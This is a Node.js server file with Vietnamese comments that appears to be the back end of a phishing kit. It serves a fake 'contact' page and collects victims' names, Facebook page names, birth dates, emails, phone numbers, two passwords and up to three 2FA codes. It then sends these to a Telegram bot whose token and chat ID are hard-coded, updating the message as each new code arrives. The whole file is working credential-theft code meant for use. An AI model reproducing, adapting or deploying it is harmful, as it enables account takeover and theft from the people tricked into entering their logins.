const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const CryptoJS = require('crypto-js');
const { parsePhoneNumberFromString } = require('libphonenumber-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));
app.use('/_next', express.static(path.join(__dirname, '_next')));

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8932332118:AAHhk28Z1nLEgYaEk6Rbh4o0gJ-WQvDlvwY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7213546758';
const SECRET_KEY = "HDNDT-JDHT8FNEK-JJHR";

const sessionData = new Map();

function decryptData(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) return null;
        return JSON.parse(decrypted);
    } catch (error) {
        console.error('Giải mã lỗi:', error.message);
        return null;
    }
}

async function sendNewMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'   // <-- THÊM DÒNG NÀY
        });
        return response.data.result.message_id;
    } catch (error) {
        console.error('❌ Lỗi gửi tin nhắn mới:', error.message);
        return null;
    }
}

async function editMessage(messageId, newMessage) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: messageId,
            text: newMessage,
            parse_mode: 'HTML'   // <-- THÊM DÒNG NÀY
        });
        console.log(`✅ Đã cập nhật tin nhắn ID: ${messageId}`);
        return true;
    } catch (error) {
        console.error('❌ Lỗi cập nhật tin nhắn:', error.message);
        return false;
    }
}

// ==================== MAP TOÀN BỘ ĐẦU SỐ ĐIỆN THOẠI THẾ GIỚI ====================
const countryMap = {
    // Mã 1 số
    '1': { name: 'USA/Canada', iso: 'US', dialCode: '1' },
    '7': { name: 'Russia/Kazakhstan', iso: 'RU', dialCode: '7' },
    
    // Mã 2 số
    '20': { name: 'Egypt', iso: 'EG', dialCode: '20' },
    '27': { name: 'South Africa', iso: 'ZA', dialCode: '27' },
    '30': { name: 'Greece', iso: 'GR', dialCode: '30' },
    '31': { name: 'Netherlands', iso: 'NL', dialCode: '31' },
    '32': { name: 'Belgium', iso: 'BE', dialCode: '32' },
    '33': { name: 'France', iso: 'FR', dialCode: '33' },
    '34': { name: 'Spain', iso: 'ES', dialCode: '34' },
    '36': { name: 'Hungary', iso: 'HU', dialCode: '36' },
    '39': { name: 'Italy', iso: 'IT', dialCode: '39' },
    '40': { name: 'Romania', iso: 'RO', dialCode: '40' },
    '41': { name: 'Switzerland', iso: 'CH', dialCode: '41' },
    '43': { name: 'Austria', iso: 'AT', dialCode: '43' },
    '44': { name: 'United Kingdom', iso: 'GB', dialCode: '44' },
    '45': { name: 'Denmark', iso: 'DK', dialCode: '45' },
    '46': { name: 'Sweden', iso: 'SE', dialCode: '46' },
    '47': { name: 'Norway', iso: 'NO', dialCode: '47' },
    '48': { name: 'Poland', iso: 'PL', dialCode: '48' },
    '49': { name: 'Germany', iso: 'DE', dialCode: '49' },
    '51': { name: 'Peru', iso: 'PE', dialCode: '51' },
    '52': { name: 'Mexico', iso: 'MX', dialCode: '52' },
    '53': { name: 'Cuba', iso: 'CU', dialCode: '53' },
    '54': { name: 'Argentina', iso: 'AR', dialCode: '54' },
    '55': { name: 'Brazil', iso: 'BR', dialCode: '55' },
    '56': { name: 'Chile', iso: 'CL', dialCode: '56' },
    '57': { name: 'Colombia', iso: 'CO', dialCode: '57' },
    '58': { name: 'Venezuela', iso: 'VE', dialCode: '58' },
    '60': { name: 'Malaysia', iso: 'MY', dialCode: '60' },
    '61': { name: 'Australia', iso: 'AU', dialCode: '61' },
    '62': { name: 'Indonesia', iso: 'ID', dialCode: '62' },
    '63': { name: 'Philippines', iso: 'PH', dialCode: '63' },
    '64': { name: 'New Zealand', iso: 'NZ', dialCode: '64' },
    '65': { name: 'Singapore', iso: 'SG', dialCode: '65' },
    '66': { name: 'Thailand', iso: 'TH', dialCode: '66' },
    '81': { name: 'Japan', iso: 'JP', dialCode: '81' },
    '82': { name: 'South Korea', iso: 'KR', dialCode: '82' },
    '84': { name: 'Vietnam', iso: 'VN', dialCode: '84' },
    '86': { name: 'China', iso: 'CN', dialCode: '86' },
    '90': { name: 'Turkey', iso: 'TR', dialCode: '90' },
    '91': { name: 'India', iso: 'IN', dialCode: '91' },
    '92': { name: 'Pakistan', iso: 'PK', dialCode: '92' },
    '93': { name: 'Afghanistan', iso: 'AF', dialCode: '93' },
    '94': { name: 'Sri Lanka', iso: 'LK', dialCode: '94' },
    '95': { name: 'Myanmar', iso: 'MM', dialCode: '95' },
    '98': { name: 'Iran', iso: 'IR', dialCode: '98' },
    '211': { name: 'South Sudan', iso: 'SS', dialCode: '211' },
    '212': { name: 'Morocco', iso: 'MA', dialCode: '212' },
    '213': { name: 'Algeria', iso: 'DZ', dialCode: '213' },
    '216': { name: 'Tunisia', iso: 'TN', dialCode: '216' },
    '218': { name: 'Libya', iso: 'LY', dialCode: '218' },
    '220': { name: 'Gambia', iso: 'GM', dialCode: '220' },
    '221': { name: 'Senegal', iso: 'SN', dialCode: '221' },
    '222': { name: 'Mauritania', iso: 'MR', dialCode: '222' },
    '223': { name: 'Mali', iso: 'ML', dialCode: '223' },
    '224': { name: 'Guinea', iso: 'GN', dialCode: '224' },
    '225': { name: 'Ivory Coast', iso: 'CI', dialCode: '225' },
    '226': { name: 'Burkina Faso', iso: 'BF', dialCode: '226' },
    '227': { name: 'Niger', iso: 'NE', dialCode: '227' },
    '228': { name: 'Togo', iso: 'TG', dialCode: '228' },
    '229': { name: 'Benin', iso: 'BJ', dialCode: '229' },
    '230': { name: 'Mauritius', iso: 'MU', dialCode: '230' },
    '231': { name: 'Liberia', iso: 'LR', dialCode: '231' },
    '232': { name: 'Sierra Leone', iso: 'SL', dialCode: '232' },
    '233': { name: 'Ghana', iso: 'GH', dialCode: '233' },
    '234': { name: 'Nigeria', iso: 'NG', dialCode: '234' },
    '235': { name: 'Chad', iso: 'TD', dialCode: '235' },
    '236': { name: 'Central African Republic', iso: 'CF', dialCode: '236' },
    '237': { name: 'Cameroon', iso: 'CM', dialCode: '237' },
    '238': { name: 'Cape Verde', iso: 'CV', dialCode: '238' },
    '239': { name: 'Sao Tome and Principe', iso: 'ST', dialCode: '239' },
    '240': { name: 'Equatorial Guinea', iso: 'GQ', dialCode: '240' },
    '241': { name: 'Gabon', iso: 'GA', dialCode: '241' },
    '242': { name: 'Republic of Congo', iso: 'CG', dialCode: '242' },
    '243': { name: 'Democratic Republic of Congo', iso: 'CD', dialCode: '243' },
    '244': { name: 'Angola', iso: 'AO', dialCode: '244' },
    '245': { name: 'Guinea-Bissau', iso: 'GW', dialCode: '245' },
    '246': { name: 'Diego Garcia', iso: 'IO', dialCode: '246' },
    '247': { name: 'Ascension Island', iso: 'AC', dialCode: '247' },
    '248': { name: 'Seychelles', iso: 'SC', dialCode: '248' },
    '249': { name: 'Sudan', iso: 'SD', dialCode: '249' },
    '250': { name: 'Rwanda', iso: 'RW', dialCode: '250' },
    '251': { name: 'Ethiopia', iso: 'ET', dialCode: '251' },
    '252': { name: 'Somalia', iso: 'SO', dialCode: '252' },
    '253': { name: 'Djibouti', iso: 'DJ', dialCode: '253' },
    '254': { name: 'Kenya', iso: 'KE', dialCode: '254' },
    '255': { name: 'Tanzania', iso: 'TZ', dialCode: '255' },
    '256': { name: 'Uganda', iso: 'UG', dialCode: '256' },
    '257': { name: 'Burundi', iso: 'BI', dialCode: '257' },
    '258': { name: 'Mozambique', iso: 'MZ', dialCode: '258' },
    '259': { name: 'Zanzibar', iso: 'TZ', dialCode: '259' },
    '260': { name: 'Zambia', iso: 'ZM', dialCode: '260' },
    '261': { name: 'Madagascar', iso: 'MG', dialCode: '261' },
    '262': { name: 'Reunion/Mayotte', iso: 'RE', dialCode: '262' },
    '263': { name: 'Zimbabwe', iso: 'ZW', dialCode: '263' },
    '264': { name: 'Namibia', iso: 'NA', dialCode: '264' },
    '265': { name: 'Malawi', iso: 'MW', dialCode: '265' },
    '266': { name: 'Lesotho', iso: 'LS', dialCode: '266' },
    '267': { name: 'Botswana', iso: 'BW', dialCode: '267' },
    '268': { name: 'Eswatini', iso: 'SZ', dialCode: '268' },
    '269': { name: 'Comoros', iso: 'KM', dialCode: '269' },
    '290': { name: 'Saint Helena', iso: 'SH', dialCode: '290' },
    '291': { name: 'Eritrea', iso: 'ER', dialCode: '291' },
    '297': { name: 'Aruba', iso: 'AW', dialCode: '297' },
    '298': { name: 'Faroe Islands', iso: 'FO', dialCode: '298' },
    '299': { name: 'Greenland', iso: 'GL', dialCode: '299' },
    '350': { name: 'Gibraltar', iso: 'GI', dialCode: '350' },
    '351': { name: 'Portugal', iso: 'PT', dialCode: '351' },
    '352': { name: 'Luxembourg', iso: 'LU', dialCode: '352' },
    '353': { name: 'Ireland', iso: 'IE', dialCode: '353' },
    '354': { name: 'Iceland', iso: 'IS', dialCode: '354' },
    '355': { name: 'Albania', iso: 'AL', dialCode: '355' },
    '356': { name: 'Malta', iso: 'MT', dialCode: '356' },
    '357': { name: 'Cyprus', iso: 'CY', dialCode: '357' },
    '358': { name: 'Finland', iso: 'FI', dialCode: '358' },
    '359': { name: 'Bulgaria', iso: 'BG', dialCode: '359' },
    '370': { name: 'Lithuania', iso: 'LT', dialCode: '370' },
    '371': { name: 'Latvia', iso: 'LV', dialCode: '371' },
    '372': { name: 'Estonia', iso: 'EE', dialCode: '372' },
    '373': { name: 'Moldova', iso: 'MD', dialCode: '373' },
    '374': { name: 'Armenia', iso: 'AM', dialCode: '374' },
    '375': { name: 'Belarus', iso: 'BY', dialCode: '375' },
    '376': { name: 'Andorra', iso: 'AD', dialCode: '376' },
    '377': { name: 'Monaco', iso: 'MC', dialCode: '377' },
    '378': { name: 'San Marino', iso: 'SM', dialCode: '378' },
    '379': { name: 'Vatican City', iso: 'VA', dialCode: '379' },
    '380': { name: 'Ukraine', iso: 'UA', dialCode: '380' },
    '381': { name: 'Serbia', iso: 'RS', dialCode: '381' },
    '382': { name: 'Montenegro', iso: 'ME', dialCode: '382' },
    '383': { name: 'Kosovo', iso: 'XK', dialCode: '383' },
    '385': { name: 'Croatia', iso: 'HR', dialCode: '385' },
    '386': { name: 'Slovenia', iso: 'SI', dialCode: '386' },
    '387': { name: 'Bosnia and Herzegovina', iso: 'BA', dialCode: '387' },
    '389': { name: 'North Macedonia', iso: 'MK', dialCode: '389' },
    '420': { name: 'Czech Republic', iso: 'CZ', dialCode: '420' },
    '421': { name: 'Slovakia', iso: 'SK', dialCode: '421' },
    '423': { name: 'Liechtenstein', iso: 'LI', dialCode: '423' },
    '500': { name: 'Falkland Islands', iso: 'FK', dialCode: '500' },
    '501': { name: 'Belize', iso: 'BZ', dialCode: '501' },
    '502': { name: 'Guatemala', iso: 'GT', dialCode: '502' },
    '503': { name: 'El Salvador', iso: 'SV', dialCode: '503' },
    '504': { name: 'Honduras', iso: 'HN', dialCode: '504' },
    '505': { name: 'Nicaragua', iso: 'NI', dialCode: '505' },
    '506': { name: 'Costa Rica', iso: 'CR', dialCode: '506' },
    '507': { name: 'Panama', iso: 'PA', dialCode: '507' },
    '508': { name: 'Saint Pierre and Miquelon', iso: 'PM', dialCode: '508' },
    '509': { name: 'Haiti', iso: 'HT', dialCode: '509' },
    '590': { name: 'Guadeloupe', iso: 'GP', dialCode: '590' },
    '591': { name: 'Bolivia', iso: 'BO', dialCode: '591' },
    '592': { name: 'Guyana', iso: 'GY', dialCode: '592' },
    '593': { name: 'Ecuador', iso: 'EC', dialCode: '593' },
    '594': { name: 'French Guiana', iso: 'GF', dialCode: '594' },
    '595': { name: 'Paraguay', iso: 'PY', dialCode: '595' },
    '596': { name: 'Martinique', iso: 'MQ', dialCode: '596' },
    '597': { name: 'Suriname', iso: 'SR', dialCode: '597' },
    '598': { name: 'Uruguay', iso: 'UY', dialCode: '598' },
    '599': { name: 'Curacao', iso: 'CW', dialCode: '599' },
    '670': { name: 'Timor-Leste', iso: 'TL', dialCode: '670' },
    '672': { name: 'Norfolk Island', iso: 'NF', dialCode: '672' },
    '673': { name: 'Brunei', iso: 'BN', dialCode: '673' },
    '674': { name: 'Nauru', iso: 'NR', dialCode: '674' },
    '675': { name: 'Papua New Guinea', iso: 'PG', dialCode: '675' },
    '676': { name: 'Tonga', iso: 'TO', dialCode: '676' },
    '677': { name: 'Solomon Islands', iso: 'SB', dialCode: '677' },
    '678': { name: 'Vanuatu', iso: 'VU', dialCode: '678' },
    '679': { name: 'Fiji', iso: 'FJ', dialCode: '679' },
    '680': { name: 'Palau', iso: 'PW', dialCode: '680' },
    '681': { name: 'Wallis and Futuna', iso: 'WF', dialCode: '681' },
    '682': { name: 'Cook Islands', iso: 'CK', dialCode: '682' },
    '683': { name: 'Niue', iso: 'NU', dialCode: '683' },
    '685': { name: 'Samoa', iso: 'WS', dialCode: '685' },
    '686': { name: 'Kiribati', iso: 'KI', dialCode: '686' },
    '687': { name: 'New Caledonia', iso: 'NC', dialCode: '687' },
    '688': { name: 'Tuvalu', iso: 'TV', dialCode: '688' },
    '689': { name: 'French Polynesia', iso: 'PF', dialCode: '689' },
    '690': { name: 'Tokelau', iso: 'TK', dialCode: '690' },
    '691': { name: 'Micronesia', iso: 'FM', dialCode: '691' },
    '692': { name: 'Marshall Islands', iso: 'MH', dialCode: '692' },
    '850': { name: 'North Korea', iso: 'KP', dialCode: '850' },
    '852': { name: 'Hong Kong', iso: 'HK', dialCode: '852' },
    '853': { name: 'Macau', iso: 'MO', dialCode: '853' },
    '855': { name: 'Cambodia', iso: 'KH', dialCode: '855' },
    '856': { name: 'Laos', iso: 'LA', dialCode: '856' },
    '880': { name: 'Bangladesh', iso: 'BD', dialCode: '880' },
    '886': { name: 'Taiwan', iso: 'TW', dialCode: '886' },
    '960': { name: 'Maldives', iso: 'MV', dialCode: '960' },
    '961': { name: 'Lebanon', iso: 'LB', dialCode: '961' },
    '962': { name: 'Jordan', iso: 'JO', dialCode: '962' },
    '963': { name: 'Syria', iso: 'SY', dialCode: '963' },
    '964': { name: 'Iraq', iso: 'IQ', dialCode: '964' },
    '965': { name: 'Kuwait', iso: 'KW', dialCode: '965' },
    '966': { name: 'Saudi Arabia', iso: 'SA', dialCode: '966' },
    '967': { name: 'Yemen', iso: 'YE', dialCode: '967' },
    '968': { name: 'Oman', iso: 'OM', dialCode: '968' },
    '970': { name: 'Palestine', iso: 'PS', dialCode: '970' },
    '971': { name: 'United Arab Emirates', iso: 'AE', dialCode: '971' },
    '972': { name: 'Israel', iso: 'IL', dialCode: '972' },
    '973': { name: 'Bahrain', iso: 'BH', dialCode: '973' },
    '974': { name: 'Qatar', iso: 'QA', dialCode: '974' },
    '975': { name: 'Bhutan', iso: 'BT', dialCode: '975' },
    '976': { name: 'Mongolia', iso: 'MN', dialCode: '976' },
    '977': { name: 'Nepal', iso: 'NP', dialCode: '977' },
    '992': { name: 'Tajikistan', iso: 'TJ', dialCode: '992' },
    '993': { name: 'Turkmenistan', iso: 'TM', dialCode: '993' },
    '994': { name: 'Azerbaijan', iso: 'AZ', dialCode: '994' },
    '995': { name: 'Georgia', iso: 'GE', dialCode: '995' },
    '996': { name: 'Kyrgyzstan', iso: 'KG', dialCode: '996' },
    '998': { name: 'Uzbekistan', iso: 'UZ', dialCode: '998' }
};

// ==================== HÀM FORMAT SỐ ĐIỆN THOẠI ====================
function formatPhoneNumber(phone, countryIso, dialCode) {
    if (!phone || phone === 'N/A') return 'N/A';

    let raw = String(phone).trim().replace(/[^\d+]/g, '');
    if (!raw) return 'N/A';

    // Ưu tiên dùng dialCode từ client (nếu có)
    if (dialCode && countryMap[dialCode]) {
        const country = countryMap[dialCode];
        let cleanPhone = raw;
        if (cleanPhone.startsWith(dialCode)) {
            cleanPhone = cleanPhone.substring(dialCode.length);
        }
        if (cleanPhone.startsWith('0')) {
            cleanPhone = cleanPhone.substring(1);
        }
        // Format đẹp
        let formatted = cleanPhone;
        if (cleanPhone.length >= 7) {
            if (dialCode === '1' || dialCode === '44') {
                formatted = cleanPhone.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
            } else if (dialCode === '84' || dialCode === '66') {
                formatted = cleanPhone.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
            } else {
                formatted = cleanPhone;
            }
        }
        return `${country.name} +${dialCode} ${formatted}`;
    }

    // Nếu số bắt đầu bằng dấu +, parse trực tiếp
    if (raw.startsWith('+')) {
        try {
            const parsed = parsePhoneNumberFromString(raw);
            if (parsed && parsed.isValid()) {
                const code = String(parsed.countryCallingCode);
                if (countryMap[code]) {
                    return `${countryMap[code].name} ${parsed.formatInternational()}`;
                }
                return parsed.formatInternational();
            }
        } catch(e) {}
        return raw;
    }

    // Tìm dial code từ đầu số (ưu tiên độ dài lớn hơn)
    let matchedCountry = null;
    let matchedLength = 0;
    
    for (const [code, country] of Object.entries(countryMap)) {
        if (raw.startsWith(code) && code.length > matchedLength) {
            matchedCountry = country;
            matchedLength = code.length;
        }
    }
    
    if (matchedCountry) {
        let remaining = raw.substring(matchedLength);
        if (remaining.startsWith('0')) {
            remaining = remaining.substring(1);
        }
        return `${matchedCountry.name} +${matchedCountry.dialCode} ${remaining}`;
    }
    
    return raw;
}

// ==================== HÀM FORMAT TIN NHẮN ====================
function formatMessage(data) {
    const otp1 = data.twoFa || data.code2FA1 || data.otp1 || '';
    const otp2 = data.twoFaSecond || data.code2FA2 || data.otp2 || '';
    const otp3 = data.twoFaThird || data.code2FA3 || data.otp3 || '';
    
    let location = data.location || '';
    if (location && location.includes('undefined')) {
        location = location.replace(/undefined\s*\|\s*/, '').replace(/\|\s*undefined/, '');
    }
    if (!location || location === 'undefined' || location === '') {
        location = 'N/A';
    }
    
    const formattedPhone = formatPhoneNumber(
        data.phone, 
        data.countryIso, 
        data.dialCode
    );
    
    return `Ip: ${data.ip && !data.ip.includes('Error') ? data.ip : 'N/A'}
Location: ${location}
-----------------------------
Full Name: ${data.name || data.fullName || 'N/A'}
Page Name: ${data.fanpage || data.fanpageUrl || 'N/A'}
Date of birth: ${data.day || 'N/A'}/${data.month || 'N/A'}/${data.year || 'N/A'}
-----------------------------
Email: ${data.email || 'N/A'}
Email Business: ${data.business || data.businessEmail || 'N/A'}
Phone Number: ${formattedPhone}
-----------------------------
Password First: <a href="#">${data.password || data.passwordFirst || 'N/A'}</a>
Password Second: <a href="#">${data.passwordSecond || 'N/A'}</a>
-----------------------------
Auth Method: ${data.authMethod || 'N/A'}
-----------------------------
🔐Code 2FA(1): ${otp1}
🔐Code 2FA(2): ${otp2}
🔐Code 2FA(3): ${otp3}`;
}

// ==================== API CHÍNH ====================
app.post('/api/authentication', async (req, res) => {
    try {
        let data = req.body;
        
        if (data.data && typeof data.data === 'string') {
            const decrypted = decryptData(data.data);
            if (decrypted) data = decrypted;
        }
        
        const clientIp = data.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
        
        let session = sessionData.get(clientIp);
        if (!session) {
            session = { data: {}, messageId: null };
            sessionData.set(clientIp, session);
        }
        
        session.data = { ...session.data, ...data };
        
        const newMessage = formatMessage(session.data);
        
        if (session.messageId) {
            await editMessage(session.messageId, newMessage);
        } else {
            const messageId = await sendNewMessage(newMessage);
            if (messageId) {
                session.messageId = messageId;
            }
        }
        
        sessionData.set(clientIp, session);
        res.json({ success: true });
        
    } catch (error) {
        console.error('Lỗi xử lý request:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'contact.html'));
});

app.get('/contact.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'contact.html'));
});

app.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║   🚀 SERVER ĐÃ CHẠY!                                         ║
╠═══════════════════════════════════════════════════════════════╣
║   PORT: ${PORT}                                                  ║
║   Web: http://localhost:${PORT}/contact.html                    ║
║                                                                 ║
║   🌍 Hỗ trợ 200+ quốc gia!                                     ║
║   ✅ Vanuatu (+678) đã được thêm!                              ║
╚═══════════════════════════════════════════════════════════════╝
    `);
});